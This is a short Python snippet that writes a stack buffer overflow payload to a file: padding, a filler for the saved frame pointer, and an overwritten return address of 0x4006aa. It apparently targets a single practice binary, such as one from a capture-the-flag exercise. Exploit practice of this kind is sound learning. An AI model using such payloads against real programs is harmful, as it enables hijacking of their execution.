with open('payload.bin', 'wb') as f:
    f.write(b'A'*0x30 + b'B'*0x8 + b'\xaa\x06\x40\x00\x00\x00\x00\x00')
